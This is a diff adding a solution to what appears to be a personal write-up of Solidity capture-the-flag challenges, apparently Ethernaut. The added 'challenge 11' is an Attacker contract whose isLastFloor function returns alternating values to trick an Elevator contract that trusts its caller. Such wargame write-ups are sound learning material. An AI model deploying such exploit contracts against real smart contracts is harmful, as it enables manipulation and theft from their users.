@@ -86,3 +86,33 @@ await window.web3.eth.getStorageAt(contract.address,1)
 
 classic reentracy attack in withdraw
 
+### challenge 11
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Elevator {
+    function goTo(uint _floor) external;
+}
+
+contract Attacker {
+    uint256 public nn;
+
+    function attack(address _address) external {
+        Elevator elevator = Elevator(_address);
+        elevator.goTo(22);
+
+    }
+
+    function isLastFloor(uint) external returns (bool) {
+        if (nn % 2 == 0) {
+            nn += 1;
+            return false;
+        } else {
+            nn += 1;
+            return true;
+        }      
+    }
+}
+```
